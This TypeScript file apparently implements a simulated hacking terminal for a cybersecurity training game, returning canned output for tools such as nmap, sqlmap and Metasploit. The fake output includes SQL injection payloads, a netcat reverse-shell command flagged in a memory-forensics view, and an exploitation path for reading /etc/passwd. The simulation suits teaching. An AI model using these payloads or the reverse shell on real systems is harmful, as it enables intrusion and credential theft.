export type CommandContext = {
    activeMission?: any;
    userProfile?: any;
    missionProgress?: any;
};

export interface CommandResult {
    output: string;
    clear?: boolean;
}

export interface CommandDefinition {
    name: string;
    description: string;
    execute: (args: string[], context: CommandContext) => CommandResult | string;
}

class TerminalService {
    private commands: Map<string, CommandDefinition> = new Map();

    constructor() {
        this.registerDefaultCommands();
    }

    register(command: CommandDefinition) {
        this.commands.set(command.name.toLowerCase(), command);
    }

    private registerDefaultCommands() {
        // help command
        this.register({
            name: 'help',
            description: 'Show available commands',
            execute: () => ({
                output: `╔════════════════════════════════════════════════════════════╗
║  CYBER QUEST TERMINAL v2.0 - COMMAND REFERENCE            ║
╠════════════════════════════════════════════════════════════╣
║ RECONNAISSANCE:                                           ║
║   scan              - Port scan target                    ║
║   nmap <target>     - Advanced network scanning           ║
║   whois <domain>    - Domain registration lookup          ║
║   dig <domain>      - DNS enumeration                     ║
║   traceroute        - Network path tracing                ║
║                                                           ║
║ ENUMERATION:                                              ║
║   enum              - System enumeration                  ║
║   dirb              - Directory brute force               ║
║   gobuster          - URL fuzzing                         ║
║   sqlmap            - SQL injection detection             ║
║                                                           ║
║ EXPLOITATION:                                             ║
║   exploit           - Run exploit module                  ║
║   msfconsole        - Launch Metasploit                   ║
║   hydra             - Password brute force                ║
║   john              - Password hash cracking              ║
║   hashcat           - Advanced hash cracking              ║
║                                                           ║
║ POST-EXPLOITATION:                                        ║
║   shell             - Spawn reverse shell                 ║
║   escalate          - Privilege escalation check          ║
║   pivot             - Network pivoting                    ║
║   exfil             - Data exfiltration simulation        ║
║                                                           ║
║ FORENSICS:                                                ║
║   strings <file>    - Extract strings from file           ║
║   binwalk           - Firmware analysis                   ║
║   volatility        - Memory forensics                    ║
║   autopsy           - File system analysis                ║
║                                                           ║
║ CRYPTOGRAPHY:                                             ║
║   base64 <text>     - Base64 encode/decode                ║
║   hash <text>       - Generate MD5/SHA hashes             ║
║   rot13 <text>      - ROT13 cipher                        ║
║   xor <key>         - XOR encryption                      ║
║                                                           ║
║ NETWORKING:                                               ║
║   ping              - ICMP echo request                   ║
║   netstat           - Network connections                 ║
║   ifconfig          - Network interface config            ║
║   tcpdump           - Packet capture                      ║
║                                                           ║
║ UTILITIES:                                                ║
║   status            - Mission progress                    ║
║   analyze           - Vulnerability analysis              ║
║   hint              - Ask ALICE for a mission hint        ║
║   clear             - Clear terminal                      ║
║   history           - Show command history                ║
╚════════════════════════════════════════════════════════════╝`
            })
        });

        // hint command
        this.register({
            name: 'hint',
            description: 'Ask ALICE for a mission hint',
            execute: () => {
                return `[ALICE] Analyzing your current progress... 
I've updated the sidebar with a new hint. You can also chat with me there for more specific guidance!`;
            }
        });

        // clear command
        this.register({
            name: 'clear',
            description: 'Clear the terminal screen',
            execute: () => ({ output: 'Terminal cleared.', clear: true })
        });

        // nmap command
        this.register({
            name: 'nmap',
            description: 'Advanced network scanning',
            execute: (args) => {
                if (args.length === 0 || args.includes('-h') || args.includes('--help')) {
                    return `Usage: nmap [Scan Type...] [Options] {target specification}
EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iL targets.txt
  nmap -p 80,443 192.168.1.100

See the man page for full options.`;
                }
                const target = args[args.length - 1];
                return `[${new Date().toLocaleTimeString()}] Starting Nmap scan on ${target}...

PORT     STATE    SERVICE      VERSION
22/tcp   open     ssh          OpenSSH 8.2p1
80/tcp   open     http         Apache httpd 2.4.41
443/tcp  open     https        Apache httpd 2.4.41 (SSL)
3306/tcp open     mysql        MySQL 8.0.28
8080/tcp open     http-proxy   Burp Proxy

Service detection performed.
OS: Linux (95% confidence)

VULNERABILITIES DETECTED:
[!] CVE-2021-41773 - Apache Path Traversal
[!] CVE-2022-22965 - Spring4Shell (if Java app detected)`;
            }
        });

        // Alias scan to nmap
        this.register({
            name: 'scan',
            description: 'Alias for nmap',
            execute: (args, context) => this.commands.get('nmap')!.execute(args, context)
        });

        // whois command
        this.register({
            name: 'whois',
            description: 'Domain registration lookup',
            execute: (args) => {
                if (args.length === 0 || args.includes('-h') || args.includes('--help')) {
                    return `Usage: whois [OPTION]... OBJECT...
                  
Example: whois example.com`;
                }
                const domain = args[args.length - 1];
                return `[${new Date().toLocaleTimeString()}] WHOIS lookup for ${domain}:

Domain Name: ${domain}
Registrar: GoDaddy.com, LLC
Creation Date: 2019-03-15T10:23:44Z
Expiration Date: 2025-03-15T10:23:44Z
Name Server: ns1.targetdns.com
Name Server: ns2.targetdns.com
Registrant Org: Target Corporation
Registrant Country: US

Admin Email: admin@${domain}
Tech Email: tech@${domain}`;
            }
        });

        // dig command
        this.register({
            name: 'dig',
            description: 'DNS enumeration',
            execute: (args) => {
                if (args.length === 0 || args.includes('-h') || args.includes('--help')) {
                    return `Usage:  dig [@global-server] [domain] [q-type] [q-class] {q-opt}
       {global-d-opt} host [@local-server] {local-d-opt}
       [ host [@local-server] {local-d-opt} [...]]

Example: dig example.com A`;
                }
                const digDomain = args[args.length - 1];
                return `[${new Date().toLocaleTimeString()}] DNS enumeration for ${digDomain}:

; <<>> DiG 9.16.1 <<>> ${digDomain}
;; ANSWER SECTION:
${digDomain}.     300    IN    A     192.168.1.100
${digDomain}.     300    IN    A     192.168.1.101
mail.${digDomain}. 300    IN    MX    10 mail.target.com.
ns1.${digDomain}.  300    IN    A     192.168.1.1
ns2.${digDomain}.  300    IN    A     192.168.1.2

;; SUBDOMAIN DISCOVERY:
www.${digDomain}     192.168.1.100
ftp.${digDomain}     192.168.1.103
admin.${digDomain}   192.168.1.104
api.${digDomain}     192.168.1.105
dev.${digDomain}     192.168.1.106`;
            }
        });

        // strings command
        this.register({
            name: 'strings',
            description: 'Extract strings from file',
            execute: (args) => {
                if (args.length === 0 || args.includes('-h') || args.includes('--help')) {
                    return `Usage: strings [option(s)] [file(s)]
 Display printable strings in [file(s)] (default: standard input)
 
 Example: strings evidence.bin`;
                }
                const filename = args[args.length - 1];
                return `[${new Date().toLocaleTimeString()}] Extracting strings from ${filename}...

--- ASCII Strings ---
/lib/ld-linux.so.2
libc.so.6
__stack_chk_fail
printf
strcmp
secret_key=SuperSecretPassword123
api_endpoint=https://api.target.com/v1
admin@target.com
/dev/null
/var/log/app.log

--- Unicode Strings ---
Copyright 2023 Target Corp
Version 2.1.4
Build: Release

[!] Interesting findings:
    - Hardcoded API key detected
    - Internal email address
    - Debug endpoint URL`;
            }
        });

        // gobuster command
        this.register({
            name: 'gobuster',
            description: 'URL fuzzing',
            execute: (args) => {
                if (args.length === 0 || args.includes('-h') || args.includes('--help')) {
                    return `Usage: gobuster [mode] [options]

Modes:
  dir       uses directory/file enumeration mode
  dns       uses DNS subdomain enumeration mode
  s3        uses S3 bucket enumeration mode
  vhost     uses VHOST enumeration mode
  
Example: gobuster dir -u http://target.com -w common.txt`;
                }
                return `[${new Date().toLocaleTimeString()}] Directory brute force started...

===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:                     http://target.com
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
===============================================================

/admin                (Status: 301) [Size: 312]
/login.php            (Status: 200) [Size: 1543]
/config               (Status: 403) [Size: 289]
/api                  (Status: 301) [Size: 308]
/backup               (Status: 301) [Size: 312]
/.git                 (Status: 200) [Size: 1024]  [!] GIT REPOSITORY EXPOSED
/phpmyadmin           (Status: 200) [Size: 8921]
/robots.txt           (Status: 200) [Size: 156]
/uploads              (Status: 301) [Size: 314]
/.env                 (Status: 200) [Size: 523]   [!] ENVIRONMENT FILE EXPOSED

[!] CRITICAL: /.git directory is exposed!
[!] CRITICAL: /.env file contains sensitive data!`;
            }
        });

        // Alias dirb to gobuster
        this.register({
            name: 'dirb',
            description: 'Alias for gobuster',
            execute: (args, context) => this.commands.get('gobuster')!.execute(args, context)
        });

        // sqlmap command
        this.register({
            name: 'sqlmap',
            description: 'SQL injection detection',
            execute: (args) => {
                if (args.length === 0 || args.includes('-h') || args.includes('--help')) {
                    return `Usage: python sqlmap.py [options]

Example: sqlmap -u "http://target.com/page.php?id=1" --dbs`;
                }
                return `[${new Date().toLocaleTimeString()}] SQLMap injection detection...

[*] testing connection to target URL
[*] checking if target is vulnerable
[✓] GET parameter 'id' appears to be 'MySQL >= 5.0' injectable

---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1=1

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT database()),0x7e))x),8446744073709551610,8446744073709551610)))

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x717a767071,0x...

[*] databases available:
[+] information_schema
[+] target_db
[+] mysql
[+] performance_schema

[*] tables in target_db:
[+] users
[+] admin
[+] credentials
[+] transactions`;
            }
        });

        // volatility command
        this.register({
            name: 'volatility',
            description: 'Memory forensics analysis',
            execute: () => `[${new Date().toLocaleTimeString()}] Memory forensics analysis...

Volatility Foundation Volatility Framework 2.6

[*] Identifying profile...
[✓] Profile: LinuxUbuntu_5_4_0-80_generic_profile

[*] Running plugins:

linux_pslist:
PID    PPID   UID    GID    COMM
1      0      0      0      systemd
452    1      0      0      sshd
891    452    1000   1000   bash
1023   891    1000   1000   nc -e /bin/bash 192.168.1.50 4444  [!] SUSPICIOUS
2045   1      33     33     apache2

linux_netstat:
Proto  Local Address      Foreign Address    State      PID/Program
TCP    0.0.0.0:22         0.0.0.0:0          LISTEN     452/sshd
TCP    0.0.0.0:80         0.0.0.0:0          LISTEN     2045/apache2
TCP    192.168.1.100:54321 192.168.1.50:4444  ESTABLISHED 1023/nc  [!] REVERSE SHELL

[!] MALICIOUS ACTIVITY DETECTED:
    - Reverse shell connection active
    - Netcat process running as user`
        });

        // autopsy command
        this.register({
            name: 'autopsy',
            description: 'File system analysis',
            execute: () => `[${new Date().toLocaleTimeString()}] File system analysis with Autopsy...

[✓] Disk image loaded: evidence.dd (250 GB)
[✓] File system: NTFS
[✓] Volume label: Windows_OS

--- Deleted Files Recovered ---
[+] /Users/Admin/Desktop/passwords.xlsx (deleted 2024-01-15)
[+] /Users/Admin/Downloads/malware.exe (deleted 2024-01-14)
[+] /Temp/browser_history.db (deleted 2024-01-16)

--- Keyword Hits ---
[+] "password" - 234 occurrences
[+] "credit card" - 12 occurrences
[+] "confidential" - 89 occurrences
[+] "192.168.1.50" - 45 occurrences (attacker IP!)

--- Timeline Analysis ---
2024-01-15 03:23:15 - Suspicious login from 192.168.1.50
2024-01-15 03:25:42 - malware.exe executed
2024-01-15 03:30:10 - Data exfiltration began
2024-01-15 04:15:33 - Log files cleared`
        });

        // base64 command
        this.register({
            name: 'base64',
            description: 'Base64 encode/decode',
            execute: (args) => {
                const b64text = args.join(' ') || 'SGVsbG8gV29ybGQ=';
                try {
                    const decoded = atob(b64text);
                    return `[${new Date().toLocaleTimeString()}] Base64 Decode:
Input:  ${b64text}
Output: ${decoded}`;
                } catch {
                    const encoded = btoa(b64text);
                    return `[${new Date().toLocaleTimeString()}] Base64 Encode:
Input:  ${b64text}
Output: ${encoded}`;
                }
            }
        });

        // hash command
        this.register({
            name: 'hash',
            description: 'Generate MD5/SHA hashes',
            execute: (args) => {
                const hashText = args.join(' ') || 'password';
                return `[${new Date().toLocaleTimeString()}] Hash generation for "${hashText}":

MD5:    ${Array(32).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')}
SHA1:   ${Array(40).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')}
SHA256: ${Array(64).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')}
SHA512: ${Array(128).fill(0).map(() => Math.floor(Math.random() * 16).toString(16)).join('')}`;
            }
        });

        // rot13 command
        this.register({
            name: 'rot13',
            description: 'ROT13 cipher',
            execute: (args) => {
                const rotText = args.join(' ') || 'Uryyb Jbeyq';
                const rot13Func = (s: string) => s.replace(/[a-zA-Z]/g, (c: string) => {
                    const code = c.charCodeAt(0);
                    const base = code <= 90 ? 65 : 97;
                    return String.fromCharCode(((code - base + 13) % 26) + base);
                });
                return `[${new Date().toLocaleTimeString()}] ROT13 Cipher:
Input:  ${rotText}
Output: ${rot13Func(rotText)}`;
            }
        });

        // xor command
        this.register({
            name: 'xor',
            description: 'XOR encryption',
            execute: (args) => {
                const xorKey = args[0] || 'key';
                return `[${new Date().toLocaleTimeString()}] XOR Encryption:
Key: ${xorKey}

XOR is a symmetric encryption algorithm.
Encryption and decryption use the same operation.

Example: "Hello" XOR "key"
H (0x48) ^ k (0x6B) = 0x23 = #
e (0x65) ^ e (0x65) = 0x00 = \\0
l (0x6C) ^ y (0x79) = 0x15
Result: #\\0\\x15...`;
            }
        });

        // ping command
        this.register({
            name: 'ping',
            description: 'ICMP echo request',
            execute: () => `[${new Date().toLocaleTimeString()}] PING 192.168.1.100:

PING 192.168.1.100 (192.168.1.100) 56(84) bytes of data.
64 bytes from 192.168.1.100: icmp_seq=1 ttl=64 time=0.523 ms
64 bytes from 192.168.1.100: icmp_seq=2 ttl=64 time=0.489 ms
64 bytes from 192.168.1.100: icmp_seq=3 ttl=64 time=0.512 ms
64 bytes from 192.168.1.100: icmp_seq=4 ttl=64 time=0.501 ms

--- 192.168.1.100 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss
round-trip min/avg/max = 0.489/0.506/0.523 ms`
        });

        // netstat command
        this.register({
            name: 'netstat',
            description: 'Network connections',
            execute: () => `[${new Date().toLocaleTimeString()}] Active network connections:

Proto Recv-Q Send-Q Local Address    Foreign Address    State       PID/Program
TCP        0      0 0.0.0.0:22       0.0.0.0:*          LISTEN      452/sshd
TCP        0      0 0.0.0.0:80       0.0.0.0:*          LISTEN      2045/apache2
TCP        0      0 0.0.0.0:443      0.0.0.0:*          LISTEN      2045/apache2
TCP        0      0 127.0.0.1:3306   0.0.0.0:*          LISTEN      891/mysqld
TCP        0      0 192.168.1.100:22 192.168.1.50:56789 ESTABLISHED 2345/sshd: admin
TCP        0      0 192.168.1.100:80 10.0.0.15:48321    TIME_WAIT   -
UDP        0      0 0.0.0.0:68       0.0.0.0:*                      234/dhclient

Active UNIX domain sockets:
Proto RefCnt Flags    Type       State         I-Node   Path
unix  2      [ ACC ]  STREAM     LISTENING     12345    /var/run/mysql.sock`
        });

        // ifconfig command
        this.register({
            name: 'ifconfig',
            description: 'Network interface config',
            execute: () => `[${new Date().toLocaleTimeString()}] Network interface configuration:

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.100  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:feb9:7c30  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:b9:7c:30  txqueuelen 1000  (Ethernet)
        RX packets 15234  bytes 12456789 (11.8 MiB)
        TX packets 8934   bytes 4567890 (4.3 MiB)

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 4567  bytes 345678 (337.5 KiB)
        TX packets 4567  bytes 345678 (337.5 KiB)

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.8.0.2  netmask 255.255.255.0  destination 10.8.0.2
        [VPN Interface - Active]`
        });

        // tcpdump command
        this.register({
            name: 'tcpdump',
            description: 'Packet capture',
            execute: () => `[${new Date().toLocaleTimeString()}] Packet capture (first 10 packets):

tcpdump: verbose output suppressed, use -v for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes

03:23:45.123456 IP 192.168.1.50.56789 > 192.168.1.100.22: Flags [S], seq 1234567890, win 29200
03:23:45.123501 IP 192.168.1.100.22 > 192.168.1.50.56789: Flags [S.], seq 987654321, ack 1234567891, win 28960
03:23:45.124123 IP 192.168.1.50.56789 > 192.168.1.100.22: Flags [.], ack 1, win 29200
03:23:45.234567 IP 192.168.1.50.56789 > 192.168.1.100.22: Flags [P.], seq 1:42, ack 1, win 29200
03:23:45.345678 IP 10.0.0.15.48321 > 192.168.1.100.80: Flags [S], seq 456789012

[!] Suspicious traffic detected:
    - Port scan from 192.168.1.50
    - Multiple SYN packets to various ports`
        });

        // history command
        this.register({
            name: 'history',
            description: 'Show command history',
            execute: (args, context) => {
                // We'll leave history partially implemented as a static string for now, 
                // as terminal history is managed in the component.
                return `[${new Date().toLocaleTimeString()}] Command history:

   1  help
   2  scan
   3  nmap 192.168.1.100
   4  enum
   5  exploit
   6  shell
   7  escalate
   8  status`;
            }
        });

        // analyze command
        this.register({
            name: 'analyze',
            description: 'Vulnerability analysis',
            execute: (args, context) => {
                const title = context.activeMission?.title || 'Current Investigation';
                return `[${new Date().toLocaleTimeString()}] Vulnerability analysis:

TARGET: ${title}
IP: 192.168.1.100

CRITICAL (CVSS 9.0-10.0):
  [CVE-2021-41773] Apache Path Traversal - EXPLOITABLE
  [CVE-2022-22965] Spring4Shell RCE - EXPLOITABLE

HIGH (CVSS 7.0-8.9):
  [CVE-2023-XXXX]  SQL Injection in login.php
  [CVE-2022-XXXX]  Outdated OpenSSH (8.2p1)

MEDIUM (CVSS 4.0-6.9):
  [INFO] Directory listing enabled
  [INFO] Stack trace exposed in error pages

LOW (CVSS 0.1-3.9):
  [INFO] Missing security headers
  [INFO] Cookie without HttpOnly flag

EXPLOITATION PATH:
  1. Use path traversal to read /etc/passwd
  2. Exploit SQL injection to dump credentials
  3. SSH with credentials
  4. Privilege escalation via SUID binary`;
            }
        });

        // status command
        this.register({
            name: 'status',
            description: 'Mission progress',
            execute: (args, context) => {
                if (!context.activeMission || !context.missionProgress) {
                    return "No active mission status available.";
                }
                const activeMission = context.activeMission;
                const missionProgress = context.missionProgress;
                const totalObjectives = activeMission.objectives?.length || 3;
                const completedCount = missionProgress.completedObjectives.length;
                const currentProgress = Math.floor((completedCount / totalObjectives) * 100);
                const nextObj = activeMission.objectives?.[missionProgress.currentStep] || 'Mission complete!';

                return `╔════════════════════════════════════════╗
║         MISSION STATUS REPORT          ║
╠════════════════════════════════════════╣
║ Mission: ${activeMission.title.substring(0, 27).padEnd(27)}║
║ Progress: ${String(currentProgress).padEnd(3)}%                          ║
║ Objectives: ${String(completedCount).padEnd(2)}/${String(totalObjectives).padEnd(2)} completed              ║
║                                        ║
║ COMMANDS EXECUTED: ${String(missionProgress.commandsExecuted.length).padEnd(15)}║
║ UNIQUE TOOLS USED: ${String(new Set(missionProgress.commandsExecuted).size).padEnd(15)}║
║                                        ║
║ CURRENT OBJECTIVE:                     ║
║ ${nextObj.substring(0, 38).padEnd(38)}║
║                                        ║
║ COMPLETED OBJECTIVES:                  ║
${missionProgress.completedObjectives.map((idx: number) =>
                    `║ ✓ ${activeMission.objectives?.[idx]?.substring(0, 35).padEnd(35)}║`
                ).join('\n') || '║ (None yet - get started!)              ║'}
╚════════════════════════════════════════╝`;
            }
        });

        // msfconsole command
        this.register({
            name: 'msfconsole',
            description: 'Launch Metasploit',
            execute: (args) => {
                if (args.includes('-h') || args.includes('--help')) {
                    return `Usage: msfconsole [options]

Example: msfconsole -q`;
                }
                return `[${new Date().toLocaleTimeString()}] Launching Metasploit Framework...

     ,           ,
    /             \\
   ((__---,,,---__))
      (_) O O (_)_________
         \\ _ /            |\\
          o_o \\   M S F   | \\
               \\   _____  |  *
                |||   WW|||
                |||     |||

       =[ metasploit v6.1.4-dev                         ]
+ -- --=[ 2137 exploits - 1142 auxiliary - 365 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 9 evasion                                       ]

msf6 > search apache

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank       Check  Description
   -   ----                                                  ---------------  ----       -----  -----------
   0   exploit/multi/http/apache_normalize_path_rce          2021-05-10       excellent  Yes    Apache HTTP Server 2.4.49 Path Traversal
   1   exploit/multi/http/struts2_content_type_ognl          2017-03-07       excellent  Yes    Apache Struts2 Content-Type OGNL Injection`;
            }
        });
    }

    execute(input: string, context: CommandContext = {}): CommandResult {
        const parts = input.trim().split(/\s+/);
        const baseCmd = parts[0].toLowerCase();
        const args = parts.slice(1);

        const command = this.commands.get(baseCmd);
        if (!command) {
            return { output: `Command not found: ${baseCmd}. Type "help" for available commands.` };
        }

        const result = command.execute(args, context);
        if (typeof result === 'string') {
            return { output: result };
        }
        return result;
    }
}

export const terminalService = new TerminalService();
